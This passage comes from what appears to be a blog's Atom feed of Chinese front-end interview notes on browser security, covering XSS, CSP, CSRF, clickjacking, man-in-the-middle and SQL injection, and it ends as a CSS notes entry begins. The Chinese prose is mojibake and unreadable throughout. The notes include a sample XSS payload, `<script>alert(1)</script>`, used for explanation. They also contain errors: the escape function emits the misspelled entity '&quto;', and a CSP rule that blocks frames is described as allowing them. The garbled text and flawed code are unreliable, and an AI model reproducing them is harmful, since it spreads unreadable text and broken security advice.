æ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç½‘ç«™æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œä»è€Œç›—å–ç”¨æˆ·çš„ä¿¡æ¯å¦‚ cookie ç­‰ã€‚</p><p>XSS çš„æœ¬è´¨æ˜¯å› ä¸ºç½‘ç«™æ²¡æœ‰å¯¹æ¶æ„ä»£ç è¿›è¡Œè¿‡æ»¤ï¼Œä¸æ­£å¸¸çš„ä»£ç æ··åˆåœ¨ä¸€èµ·äº†ï¼Œæµè§ˆå™¨æ²¡æœ‰åŠæ³•åˆ†è¾¨å“ªäº›è„šæœ¬æ˜¯å¯ä¿¡çš„ï¼Œä»è€Œå¯¼è‡´äº†æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</p><p>XSS åˆ†ä¸º<strong>æŒä¹…å‹å’ŒéæŒä¹…å‹</strong>:</p><ul><li><p>æŒä¹…å‹ä¹Ÿå°±æ˜¯æ”»å‡»çš„ä»£ç è¢«æœåŠ¡ç«¯å†™å…¥è¿›<strong>æ•°æ®åº“</strong>ä¸­ï¼Œè¿™ç§æ”»å‡»å±å®³æ€§å¾ˆå¤§ï¼Œå› ä¸ºå¦‚æœç½‘ç«™è®¿é—®é‡å¾ˆå¤§çš„è¯ï¼Œå°±ä¼šå¯¼è‡´å¤§é‡æ­£å¸¸è®¿é—®é¡µé¢çš„ç”¨æˆ·éƒ½å—åˆ°æ”»å‡»ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äºè¯„è®ºåŠŸèƒ½æ¥è¯´ï¼Œå°±å¾—é˜²èŒƒæŒä¹…å‹ XSS æ”»å‡»ï¼Œå› ä¸ºå¯ä»¥åœ¨è¯„è®ºä¸­è¾“å…¥ä»¥ä¸‹å†…å®¹<code>&lt;script&gt; alert(1) &lt;/script&gt;</code>ã€‚</p></li><li><p>éæŒä¹…å‹ä¸€èˆ¬é€šè¿‡<strong>ä¿®æ”¹ URL å‚æ•°</strong>çš„æ–¹å¼åŠ å…¥æ”»å‡»ä»£ç ï¼Œè¯±å¯¼ç”¨æˆ·è®¿é—®é“¾æ¥ä»è€Œè¿›è¡Œæ”»å‡»ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœé¡µé¢éœ€è¦ä» URL ä¸­è·å–æŸäº›å‚æ•°ä½œä¸ºå†…å®¹çš„è¯ï¼Œä¸ç»è¿‡è¿‡æ»¤å°±ä¼šå¯¼è‡´æ”»å‡»ä»£ç è¢«æ‰§è¡Œ</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://www.domain.com?name=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     </span><br></pre></td></tr></table></figure></li></ul><h2 id="å¦‚ä½•é˜²èŒƒ-XSS-æ”»å‡»ï¼Ÿ"><a href="#å¦‚ä½•é˜²èŒƒ-XSS-æ”»å‡»ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²èŒƒ XSS æ”»å‡»ï¼Ÿ"></a>å¦‚ä½•é˜²èŒƒ XSS æ”»å‡»ï¼Ÿ</h2><h3 id="è½¬ä¹‰å­—ç¬¦"><a href="#è½¬ä¹‰å­—ç¬¦" class="headerlink" title="è½¬ä¹‰å­—ç¬¦"></a>è½¬ä¹‰å­—ç¬¦</h3><p>å¯¹äºç”¨æˆ·çš„è¾“å…¥åº”è¯¥æ˜¯æ°¸è¿œä¸ä¿¡ä»»çš„ã€‚æœ€æ™®éçš„åšæ³•å°±æ˜¯è½¬ä¹‰è¾“å…¥è¾“å‡ºçš„å†…å®¹ï¼Œå¯¹äºå¼•å·ã€å°–æ‹¬å·ã€æ–œæ è¿›è¡Œè½¬ä¹‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºæ˜¾ç¤ºå¯Œæ–‡æœ¬æ¥è¯´ï¼Œæ˜¾ç„¶ä¸èƒ½é€šè¿‡ä¸Šé¢çš„åŠæ³•æ¥è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠéœ€è¦çš„æ ¼å¼ä¹Ÿè¿‡æ»¤æ‰ã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œé€šå¸¸é‡‡ç”¨ç™½åå•è¿‡æ»¤çš„åŠæ³•ã€‚</p><p>è¿˜å¯ä»¥å¯¹ä¸€äº›æ•æ„Ÿä¿¡æ¯è¿›è¡Œä¿æŠ¤ï¼Œæ¯”å¦‚ cookie ä½¿ç”¨ http-only ï¼Œä½¿å¾—è„šæœ¬æ— æ³•è·å–ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨éªŒè¯ç ï¼Œé¿å…è„šæœ¬ä¼ªè£…æˆç”¨æˆ·æ‰§è¡Œä¸€äº›æ“ä½œã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-CSP-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-CSP-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ CSP ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ CSP ï¼Ÿ</h2><p>CSP æŒ‡çš„æ˜¯å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œå®ƒçš„æœ¬è´¨æ˜¯å»ºç«‹ä¸€ä¸ªç™½åå•ï¼Œå‘Šè¯‰æµè§ˆå™¨å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚æˆ‘ä»¬åªéœ€è¦é…ç½®è§„åˆ™ï¼Œå¦‚ä½•æ‹¦æˆªç”±æµè§ˆå™¨è‡ªå·±æ¥å®ç°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥å°½é‡å‡å°‘ XSS æ”»å‡»ã€‚**(æœ€æœ‰æ•ˆçš„æ–¹æ³•)**</p><p>é€šå¸¸æœ‰ä¸¤ç§æ–¹å¼æ¥å¼€å¯ CSPï¼š</p><ol><li>è®¾ç½® HTTP Header ä¸­çš„ <code>Content-Security-Policy</code></li><li>è®¾ç½® <code>meta</code> æ ‡ç­¾çš„æ–¹å¼ <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot;&gt;</code></li></ol><p>ä»¥è®¾ç½® HTTP Header æ¥ä¸¾ä¾‹</p><ul><li>åªå…è®¸åŠ è½½æœ¬ç«™èµ„æº <code>Content-Security-Policy: default-src â€˜selfâ€™</code></li><li>åªå…è®¸åŠ è½½ HTTPS åè®®å›¾ç‰‡ <code>Content-Security-Policy: img-src https://*</code></li><li>å…è®¸åŠ è½½ä»»ä½•æ¥æºæ¡†æ¶ <code>Content-Security-Policy: child-src &#39;none&#39;</code></li></ul><h2 id="ä»€ä¹ˆæ˜¯-CSRF-æ”»å‡»ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-CSRF-æ”»å‡»ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ CSRF æ”»å‡»ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ CSRF æ”»å‡»ï¼Ÿ</h2><p>CSRF ä¸­æ–‡åä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚åŸç†å°±æ˜¯æ”»å‡»è€…æ„é€ å‡ºä¸€ä¸ªåç«¯è¯·æ±‚åœ°å€ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æˆ–è€…é€šè¿‡æŸäº›é€”å¾„è‡ªåŠ¨å‘èµ·è¯·æ±‚ã€‚å¦‚æœç”¨æˆ·æ˜¯åœ¨ç™»å½•çŠ¶æ€ä¸‹çš„è¯ï¼Œåç«¯å°±ä»¥ä¸ºæ˜¯ç”¨æˆ·åœ¨æ“ä½œï¼Œä»è€Œè¿›è¡Œç›¸åº”çš„é€»è¾‘ã€‚CSRF æ”»å‡»çš„<strong>æœ¬è´¨</strong>æ˜¯åˆ©ç”¨äº† cookie ä¼šåœ¨åŒæºè¯·æ±‚ä¸­æºå¸¦å‘é€ç»™æœåŠ¡å™¨çš„ç‰¹ç‚¹ï¼Œä»¥æ­¤æ¥å®ç°ç”¨æˆ·çš„å†’å……ã€‚</p><p>CSRF æ”»å‡»ç±»å‹ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š</p><ul><li><p>GET ç±»å‹ï¼Œæ¯”å¦‚åœ¨ç½‘ç«™ä¸­çš„ä¸€ä¸ª img æ ‡ç­¾é‡Œæ„å»ºä¸€ä¸ªè¯·æ±‚ï¼Œå½“ç”¨æˆ·æ‰“å¼€è¿™ä¸ªç½‘ç«™çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨å‘èµ·æäº¤ã€‚</p></li><li><p>POST ç±»å‹ï¼Œæ¯”å¦‚è¯´æ„å»ºä¸€ä¸ªè¡¨å•ï¼Œç„¶åéšè—å®ƒï¼Œå½“ç”¨æˆ·è¿›å…¥é¡µé¢æ—¶ï¼Œè‡ªåŠ¨æäº¤è¿™ä¸ªè¡¨å•ã€‚</p></li><li><p>é“¾æ¥ç±»å‹ï¼Œæ¯”å¦‚è¯´åœ¨ a æ ‡ç­¾çš„ href å±æ€§é‡Œæ„å»ºä¸€ä¸ªè¯·æ±‚ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·å»ç‚¹å‡»ã€‚</p></li></ul><h2 id="å¦‚ä½•é˜²èŒƒ-CSRF-æ”»å‡»ï¼Ÿ"><a href="#å¦‚ä½•é˜²èŒƒ-CSRF-æ”»å‡»ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²èŒƒ CSRF æ”»å‡»ï¼Ÿ"></a>å¦‚ä½•é˜²èŒƒ CSRF æ”»å‡»ï¼Ÿ</h2><p>é˜²èŒƒ CSRF æ”»å‡»å¯ä»¥éµå¾ªä»¥ä¸‹å‡ ç§è§„åˆ™ï¼š</p><ol><li>Get è¯·æ±‚ä¸å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹</li><li>ä¸è®©ç¬¬ä¸‰æ–¹ç½‘ç«™è®¿é—®åˆ°ç”¨æˆ· Cookie</li><li>é˜»æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™è¯·æ±‚æ¥å£</li><li>è¯·æ±‚æ—¶é™„å¸¦éªŒè¯ä¿¡æ¯ï¼Œæ¯”å¦‚éªŒè¯ç æˆ–è€… Token</li></ol><h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p>å¯ä»¥å¯¹ Cookie è®¾ç½® <code>SameSite</code> å±æ€§ã€‚è¯¥å±æ€§è¡¨ç¤º Cookie ä¸éšç€è·¨åŸŸè¯·æ±‚å‘é€ï¼Œå¯ä»¥å¾ˆå¤§ç¨‹åº¦å‡å°‘ CSRF çš„æ”»å‡»ï¼Œä½†æ˜¯è¯¥å±æ€§ç›®å‰å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½å…¼å®¹ï¼Œä¸”å› ä¸ºå®ƒä¸æ”¯æŒå­åŸŸï¼Œæ‰€ä»¥å­åŸŸæ²¡æœ‰åŠæ³•ä¸ä¸»åŸŸå…±äº«ç™»å½•ä¿¡æ¯ï¼Œæ¯æ¬¡è½¬å…¥å­åŸŸçš„ç½‘ç«™ï¼Œéƒ½ä¼šé‡æ–°ç™»å½•ã€‚</p><p>Samesite ä¸€å…±æœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼ˆstrictï¼‰ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ cookie åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å¯èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹ Cookie ä½¿ç”¨ï¼Œåœ¨å®½æ¾æ¨¡å¼ï¼ˆLaxï¼‰ä¸‹ï¼Œcookie å¯ä»¥è¢«è¯·æ±‚æ˜¯ GET è¯·æ±‚ï¼Œä¸”ä¼šå‘ç”Ÿé¡µé¢è·³è½¬çš„è¯·æ±‚æ‰€ä½¿ç”¨ã€‚</p><h3 id="éªŒè¯-Referer"><a href="#éªŒè¯-Referer" class="headerlink" title="éªŒè¯ Referer"></a>éªŒè¯ Referer</h3><p>åŒæºæ£€æµ‹çš„æ–¹æ³•ï¼Œå¯¹äºéœ€è¦é˜²èŒƒ CSRF çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡éªŒè¯ http è¯·æ±‚å¤´ä¸­çš„ Referer æ¥åˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦ä¸ºç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·çš„ã€‚</p><p>è¿™ç§æ–¹å¼çš„ç¼ºç‚¹æ˜¯æœ‰äº›æƒ…å†µä¸‹ referer å¯ä»¥è¢«ä¼ªé€ ã€‚è¿˜æœ‰å°±æ˜¯æˆ‘ä»¬è¿™ç§æ–¹æ³•åŒæ—¶æŠŠæœç´¢å¼•æ“çš„é“¾æ¥ä¹Ÿç»™å±è”½äº†ï¼Œæ‰€ä»¥ä¸€èˆ¬ç½‘ç«™ä¼šå…è®¸æœç´¢å¼•æ“çš„é¡µé¢è¯·æ±‚ï¼Œä½†æ˜¯ç›¸åº”çš„é¡µé¢è¯·æ±‚è¿™ç§è¯·æ±‚æ–¹å¼ä¹Ÿå¯èƒ½è¢«æ”»å‡»è€…ç»™åˆ©ç”¨ã€‚</p><h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›ä¸€ä¸ªéšæœºæ•° Tokenï¼Œæ¯æ¬¡å‘èµ·è¯·æ±‚æ—¶å°† Token æºå¸¦ä¸Šï¼ŒæœåŠ¡å™¨éªŒè¯ Token æ˜¯å¦æœ‰æ•ˆã€‚</p><p>è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯æˆ‘ä»¬éœ€è¦ç»™ç½‘ç«™ä¸­çš„æ‰€æœ‰è¯·æ±‚éƒ½æ·»åŠ ä¸Šè¿™ä¸ª tokenï¼Œæ“ä½œæ¯”è¾ƒç¹çã€‚è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ä¸€èˆ¬ä¸ä¼šåªæœ‰ä¸€å°ç½‘ç«™æœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘ä»¬çš„è¯·æ±‚ç»è¿‡è´Ÿè½½å¹³è¡¡è½¬ç§»åˆ°äº†å…¶ä»–çš„æœåŠ¡å™¨ï¼Œä½†æ˜¯è¿™ä¸ªæœåŠ¡å™¨çš„ session ä¸­æ²¡æœ‰ä¿ç•™è¿™ä¸ª token çš„è¯ï¼Œå°±æ²¡æœ‰åŠæ³•éªŒè¯äº†ã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å˜ token çš„æ„å»ºæ–¹å¼æ¥è§£å†³ã€‚</p><h3 id="åŒé‡-Cookie-éªŒè¯"><a href="#åŒé‡-Cookie-éªŒè¯" class="headerlink" title="åŒé‡ Cookie éªŒè¯"></a>åŒé‡ Cookie éªŒè¯</h3><p>æœåŠ¡å™¨åœ¨ç”¨æˆ·è®¿é—®ç½‘ç«™é¡µé¢æ—¶ï¼Œå‘è¯·æ±‚åŸŸåæ³¨å…¥ä¸€ä¸ªCookieï¼Œå†…å®¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼Œç„¶åå½“ç”¨æˆ·å†æ¬¡å‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä» cookie ä¸­å–å‡ºè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæ·»åŠ åˆ° URL å‚æ•°ä¸­ï¼Œç„¶åæœåŠ¡å™¨é€šè¿‡å¯¹ cookie ä¸­çš„æ•°æ®å’Œå‚æ•°ä¸­çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œæ¥è¿›è¡ŒéªŒè¯ã€‚</p><p>ä½¿ç”¨è¿™ç§æ–¹å¼æ˜¯åˆ©ç”¨äº†æ”»å‡»è€…åªèƒ½åˆ©ç”¨ cookieï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®è·å– cookie çš„ç‰¹ç‚¹ã€‚å¹¶ä¸”è¿™ç§æ–¹æ³•æ¯” CSRF Token çš„æ–¹æ³•æ›´åŠ æ–¹ä¾¿ï¼Œå¹¶ä¸”ä¸æ¶‰åŠåˆ°åˆ†å¸ƒå¼è®¿é—®çš„é—®é¢˜ã€‚è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯å¦‚æœç½‘ç«™å­˜åœ¨ XSS æ¼æ´çš„ï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼ä¼šå¤±æ•ˆã€‚åŒæ—¶è¿™ç§æ–¹å¼ä¸èƒ½åšåˆ°å­åŸŸåçš„éš”ç¦»ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒï¼Ÿ</h2><p>ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§è§†è§‰æ¬ºéª—çš„æ”»å‡»æ‰‹æ®µã€‚æ”»å‡»è€…å°†éœ€è¦æ”»å‡»çš„ç½‘ç«™é€šè¿‡ <code>iframe</code> åµŒå¥—çš„æ–¹å¼åµŒå…¥è‡ªå·±çš„ç½‘é¡µä¸­ï¼Œå¹¶å°† <code>iframe</code> è®¾ç½®ä¸ºé€æ˜ï¼Œåœ¨é¡µé¢ä¸­é€å‡ºä¸€ä¸ªæŒ‰é’®è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚</p><h2 id="å¦‚ä½•é˜²èŒƒç‚¹å‡»åŠ«æŒï¼Ÿ"><a href="#å¦‚ä½•é˜²èŒƒç‚¹å‡»åŠ«æŒï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²èŒƒç‚¹å‡»åŠ«æŒï¼Ÿ"></a>å¦‚ä½•é˜²èŒƒç‚¹å‡»åŠ«æŒï¼Ÿ</h2><h3 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h3><p><code>X-FRAME-OPTIONS</code> æ˜¯ä¸€ä¸ª HTTP å“åº”å¤´ï¼Œåœ¨ç°ä»£æµè§ˆå™¨æœ‰ä¸€ä¸ªå¾ˆå¥½çš„æ”¯æŒã€‚è¿™ä¸ª HTTP å“åº”å¤´å°±æ˜¯ä¸ºäº†é˜²å¾¡ç”¨ <code>iframe</code> åµŒå¥—çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚<code>header(&#39;X-Frame-Options:DENY&#39;)</code></p><p>è¯¥å“åº”å¤´æœ‰ä¸‰ä¸ªå€¼å¯é€‰ï¼Œåˆ†åˆ«æ˜¯</p><ul><li><code>DENY</code>ï¼Œè¡¨ç¤ºé¡µé¢ä¸å…è®¸é€šè¿‡ <code>iframe</code> çš„æ–¹å¼å±•ç¤º</li><li><code>SAMEORIGIN</code>ï¼Œè¡¨ç¤ºé¡µé¢å¯ä»¥åœ¨ç›¸åŒåŸŸåä¸‹é€šè¿‡ <code>iframe</code> çš„æ–¹å¼å±•ç¤º</li><li><code>ALLOW-FROM</code>ï¼Œè¡¨ç¤ºé¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ <code>iframe</code> ä¸­å±•ç¤º</li></ul><h3 id="JS-é˜²å¾¡"><a href="#JS-é˜²å¾¡" class="headerlink" title="JS é˜²å¾¡"></a>JS é˜²å¾¡</h3><p>å¯¹äºæŸäº›è¿œå¤æµè§ˆå™¨æ¥è¯´ï¼Œå¹¶ä¸èƒ½æ”¯æŒä¸Šé¢çš„è¿™ç§æ–¹å¼ï¼Œé‚£åªæœ‰é€šè¿‡ JS çš„æ–¹å¼æ¥é˜²å¾¡ç‚¹å‡»åŠ«æŒã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span> (top.location != <span class="built_in">window</span>.location)&#123;</span><br><span class="line">        top.location = <span class="built_in">window</span>.location </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="ä»€ä¹ˆæ˜¯ä¸­é—´äººæ”»å‡»ï¼Ÿå¦‚ä½•é˜²èŒƒä¸­é—´äººæ”»å‡»ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ä¸­é—´äººæ”»å‡»ï¼Ÿå¦‚ä½•é˜²èŒƒä¸­é—´äººæ”»å‡»ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¸­é—´äººæ”»å‡»ï¼Ÿå¦‚ä½•é˜²èŒƒä¸­é—´äººæ”»å‡»ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ä¸­é—´äººæ”»å‡»ï¼Ÿå¦‚ä½•é˜²èŒƒä¸­é—´äººæ”»å‡»ï¼Ÿ</h2><p>ä¸­é—´äººæ”»å‡»æ˜¯æ”»å‡»æ–¹åŒæ—¶ä¸æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å»ºç«‹èµ·äº†è¿æ¥ï¼Œå¹¶è®©å¯¹æ–¹è®¤ä¸ºè¿æ¥æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯å®é™…ä¸Šæ•´ä¸ªé€šä¿¡è¿‡ç¨‹éƒ½è¢«æ”»å‡»è€…æ§åˆ¶äº†ã€‚æ”»å‡»è€…ä¸ä»…èƒ½è·å¾—åŒæ–¹çš„é€šä¿¡ä¿¡æ¯ï¼Œè¿˜èƒ½ä¿®æ”¹é€šä¿¡ä¿¡æ¯ã€‚</p><p>é€šå¸¸æ¥è¯´ä¸å»ºè®®ä½¿ç”¨å…¬å…±çš„ Wi-Fiï¼Œå› ä¸ºå¾ˆå¯èƒ½å°±ä¼šå‘ç”Ÿä¸­é—´äººæ”»å‡»çš„æƒ…å†µã€‚å¦‚æœä½ åœ¨é€šä¿¡çš„è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°äº†æŸäº›æ•æ„Ÿä¿¡æ¯ï¼Œå°±å®Œå…¨æš´éœ²ç»™æ”»å‡»æ–¹äº†ã€‚</p><p>é˜²å¾¡ä¸­é—´äººæ”»å‡»å…¶å®å¹¶ä¸éš¾ï¼Œåªéœ€è¦å¢åŠ ä¸€ä¸ªå®‰å…¨é€šé“æ¥ä¼ è¾“ä¿¡æ¯ã€‚HTTPS å°±å¯ä»¥ç”¨æ¥é˜²å¾¡ä¸­é—´äººæ”»å‡»ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è¯´ä½¿ç”¨äº† HTTPS å°±å¯ä»¥é«˜æ•æ— å¿§äº†ï¼Œå› ä¸ºå¦‚æœä½ æ²¡æœ‰å®Œå…¨å…³é—­ HTTP è®¿é—®çš„è¯ï¼Œæ”»å‡»æ–¹å¯ä»¥é€šè¿‡æŸäº›æ–¹å¼å°† HTTPS é™çº§ä¸º HTTP ä»è€Œå®ç°ä¸­é—´äººæ”»å‡»ã€‚</p><h2 id="SQL-æ³¨å…¥æ”»å‡»ï¼Ÿ"><a href="#SQL-æ³¨å…¥æ”»å‡»ï¼Ÿ" class="headerlink" title="SQL æ³¨å…¥æ”»å‡»ï¼Ÿ"></a>SQL æ³¨å…¥æ”»å‡»ï¼Ÿ</h2><p>SQL æ³¨å…¥æ”»å‡»æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨ HTTP è¯·æ±‚ä¸­æ³¨å…¥æ¶æ„çš„ SQL ä»£ç ï¼ŒæœåŠ¡å™¨ä½¿ç”¨å‚æ•°æ„å»ºæ•°æ®åº“ SQL å‘½ä»¤æ—¶ï¼Œæ¶æ„ SQL è¢«ä¸€èµ·æ„é€ ï¼Œç ´ååŸæœ‰ SQL ç»“æ„ï¼Œå¹¶åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œï¼Œè¾¾åˆ°ç¼–å†™ç¨‹åºæ—¶æ„æ–™ä¹‹å¤–ç»“æœçš„æ”»å‡»è¡Œä¸ºã€‚</p><h1 id="å¦‚ä½•æ£€æµ‹æµè§ˆå™¨æ‰€æ”¯æŒçš„æœ€å°å­—ä½“å¤§å°ï¼Ÿ"><a href="#å¦‚ä½•æ£€æµ‹æµè§ˆå™¨æ‰€æ”¯æŒçš„æœ€å°å­—ä½“å¤§å°ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ£€æµ‹æµè§ˆå™¨æ‰€æ”¯æŒçš„æœ€å°å­—ä½“å¤§å°ï¼Ÿ"></a>å¦‚ä½•æ£€æµ‹æµè§ˆå™¨æ‰€æ”¯æŒçš„æœ€å°å­—ä½“å¤§å°ï¼Ÿ</h1><p>ç”¨ JS è®¾ç½® DOM çš„å­—ä½“ä¸ºæŸä¸€ä¸ªå€¼ï¼Œç„¶åå†å–å‡ºæ¥ï¼Œå¦‚æœå€¼è®¾ç½®æˆåŠŸï¼Œå°±è¯´æ˜æ”¯æŒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ æµè§ˆå™¨ç›¸å…³çŸ¥è¯†ï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š&lt;a href=&quot;https://juejin.cn/p</summary>
      
    
    
    
    <category term="é¢è¯•å‡†å¤‡" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="æµè§ˆå™¨" scheme="http://example.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>ã€é¢è¯•å‡†å¤‡ã€‘â€” â€” CSSç¯‡</title>
    <link href="http://example.com/2021/06/29/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20CSS%E7%AF%87/"/>
    <id>http://example.com/2021/06/29/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20CSS%E7%AF%87/</id>
    <published>2021-06-29T10:24:40.000Z</published>
    <updated>2021-07-01T13:11:01.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ CSSï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/Css/Css.md">CSS é¢è¯•çŸ¥è¯†ç‚¹æ€»ç»“</a>ã€‚ä¾µæƒåˆ ã€‚</p><h1 id="å¸¸è§çš„-CSS-å¸ƒå±€"><a href="#å¸¸è§çš„-CSS-å¸ƒå±€" class="headerlink" title="å¸¸è§çš„ CSS å¸ƒå±€"></a>å¸¸è§çš„ CSS å¸ƒå±€</h1><p>å‚è€ƒè‡ª<a href="https://juejin.cn/post/6844903710070407182#heading-12">å‡ ç§å¸¸è§çš„CSSå¸ƒå±€</a></p><h2 id="ä¸€ã€å•åˆ—å¸ƒå±€"><a href="#ä¸€ã€å•åˆ—å¸ƒå±€" class="headerlink" title="ä¸€ã€å•åˆ—å¸ƒå±€"></a>ä¸€ã€å•åˆ—å¸ƒå±€</h2><p><img 